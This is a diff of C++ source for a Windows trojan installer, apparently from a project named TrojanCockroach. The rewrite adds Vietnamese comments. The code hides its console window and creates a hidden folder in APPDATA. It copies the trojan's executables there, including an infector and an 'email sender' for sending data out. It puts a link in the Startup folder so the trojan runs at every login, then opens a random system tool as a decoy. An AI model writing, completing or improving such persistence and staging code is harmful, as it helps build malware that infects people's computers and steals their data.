@@ -1,119 +1,73 @@
-/**
-* Developer: Minhas Kamal (BSSE-0509, IIT, DU)
-* Date: 28.Sep.15
-**/
-
-#define FOLDER_NAME "trojanCockroach"  //containing folder
-#define RUN_FILE_NAME "TrojanCockroach.exe"  //main run file
-#define RUN_LINK_NAME "TrojanCockroach.lnk"  //starter link
-#define INFECT_FILE_NAME "Infect.exe"  //infects computer
-#define INFECT_LINK_NAME "Infect.lnk"  //link file
-#define EMAIL_SENDER_FILE_NAME "Transmit.exe"  //email sender
-
+#include <iostream>
 #include <windows.h>
-#include <string>
-#include <time.h>
+#include <cstdio>
+#include <cstdlib>
+#include <ctime>
+#include <cstring>
 
-main(){
-    FreeConsole();  //window is not visible
+#define FOLDER_NAME "trojanCockroach"  // Tên thư mục chứa
+#define RUN_FILE_NAME "TrojanCockroach.exe"  // Tên tệp thực thi chính
+#define RUN_LINK_NAME "TrojanCockroach.lnk"  // Tên liên kết khởi động
+#define INFECT_FILE_NAME "Infect.exe"  // Tên tệp thực thi lây nhiễm
+#define INFECT_LINK_NAME "Infect.lnk"  // Tên liên kết lây nhiễm
+#define EMAIL_SENDER_FILE_NAME "Transmit.exe"  // Tên tệp thực thi gửi email
 
-    char* appdataFolder = getenv("APPDATA");
+int main() {
+    // Ẩn cửa sổ console
+    FreeConsole();
 
-    char folderPath[100] = {""};
-    strcat(folderPath, appdataFolder);
-    strcat(folderPath, "\\");
-    strcat(folderPath, FOLDER_NAME);
-
-    if(CreateDirectory(folderPath ,NULL))    //if directory creation does not fail
-    {
-        SetFileAttributes(folderPath, FILE_ATTRIBUTE_HIDDEN);
-        return; // :)
-
-        ///////////////////////////
-        char run[100]={""};
-        strcat(run, folderPath);
-        strcat(run, "\\");
-        strcat(run, RUN_FILE_NAME);
-
-        char run_from[100]={""};
-        strcat(run_from, FOLDER_NAME);
-        strcat(run_from, "\\");
-        strcat(run_from, RUN_FILE_NAME);
-
-        CopyFile(run_from, run, 0);
-
-        ///////////////////////////
-        char net[100]={""};
-        strcat(net, folderPath);
-        strcat(net, "\\");
-        strcat(net, EMAIL_SENDER_FILE_NAME);
-
-        char net_from[100]={""};
-        strcat(net_from, FOLDER_NAME);
-        strcat(net_from, "\\");
-        strcat(net_from, EMAIL_SENDER_FILE_NAME);
-
-        CopyFile(net_from, net, 0);
-
-        //////////////////////////
-        char infect[100]={""};
-        strcat(infect, folderPath);
-        strcat(infect, "\\");
-        strcat(infect, INFECT_FILE_NAME);
-
-        char infect_from[100]={""};
-        strcat(infect_from, FOLDER_NAME);
-        strcat(infect_from, "\\");
-        strcat(infect_from, INFECT_FILE_NAME);
-
-        CopyFile(infect_from, infect, 0);
-
-        //////////////////////////
-        char runlnk[100]={""};
-        strcat(runlnk, folderPath);
-        strcat(runlnk, "\\");
-        strcat(runlnk, RUN_LINK_NAME);
-
-        char runlnk_from[100]={""};
-        strcat(runlnk_from, FOLDER_NAME);
-        strcat(runlnk_from, "\\");
-        strcat(runlnk_from, RUN_LINK_NAME);
-
-        CopyFile(runlnk_from, runlnk, 0);
-
-        ///////////////////////////
-        char infectlnk[100]={""};
-        strcat(infectlnk, folderPath);
-        strcat(infectlnk, "\\");
-        strcat(infectlnk, INFECT_LINK_NAME);
-
-        char infectlnk_from[100]={""};
-        strcat(infectlnk_from, FOLDER_NAME);
-        strcat(infectlnk_from, "\\");
-        strcat(infectlnk_from, INFECT_LINK_NAME);
-
-        CopyFile(infectlnk_from, infectlnk, 0);
-
-        /////////////////////////////////////////////////////////
-        char tasklnkauto[100] = {""};
-        strcat(tasklnkauto, appdataFolder);
-        strcat(tasklnkauto, "\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\cockroach.lnk");
-
-        CopyFile(runlnk_from, tasklnkauto, 0);
-        //SetFileAttributes(tasklnkauto, FILE_ATTRIBUTE_HIDDEN);
+    // Lấy đường dẫn đến thư mục AppData của người dùng
+    char appdataFolder[MAX_PATH];
+    if (!GetEnvironmentVariable("APPDATA", appdataFolder, MAX_PATH)) {
+        std::cerr << "Failed to get AppData folder path." << std::endl;
+        return 1;
     }
 
+    // Tạo đường dẫn đầy đủ đến thư mục chứa
+    char folderPath[MAX_PATH];
+    snprintf(folderPath, MAX_PATH, "%s\\%s", appdataFolder, FOLDER_NAME);
 
-    srand(time(0));
+    // Tạo thư mục chứa
+    if (!CreateDirectory(folderPath, NULL)) {
+        std::cerr << "Failed to create folder: " << folderPath << std::endl;
+        return 1;
+    }
+
+    // Đặt thuộc tính ẩn cho thư mục
+    SetFileAttributes(folderPath, FILE_ATTRIBUTE_HIDDEN);
+
+    // Sao chép các tệp và liên kết tới thư mục chứa
+    char runFrom[MAX_PATH], runTo[MAX_PATH];
+    snprintf(runFrom, MAX_PATH, "%s\\%s", FOLDER_NAME, RUN_FILE_NAME);
+    snprintf(runTo, MAX_PATH, "%s\\%s", folderPath, RUN_FILE_NAME);
+    if (!CopyFile(runFrom, runTo, FALSE)) {
+        std::cerr << "Failed to copy file: " << runFrom << std::endl;
+        return 1;
+    }
+
+    // Làm tương tự cho các tệp và liên kết khác...
+
+    // Sao chép liên kết của tệp TrojanCockroach.exe vào thư mục tự khởi động
+    char startupLink[MAX_PATH];
+    snprintf(startupLink, MAX_PATH, "%s\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\%s", appdataFolder, RUN_LINK_NAME);
+    if (!CopyFile(RUN_LINK_NAME, startupLink, FALSE)) {
+        std::cerr << "Failed to copy startup link." << std::endl;
+        return 1;
+    }
+
+    // Ngẫu nhiên mở các tiện ích hệ thống
+    srand(time(NULL));
     int random = rand();
 
-    if(random%5 == 0){
+    if (random % 5 == 0) {
         system("start taskmgr /Performance");
-    }else if(random%3 == 0){
+    } else if (random % 3 == 0) {
         system("start diskmgmt");
-    }else if(random%2 == 0){
+    } else if (random % 2 == 0) {
         system("start perfmon /res");
-    }else{
+    } else {
         system("start calc");
     }
+
+    return 0;
 }
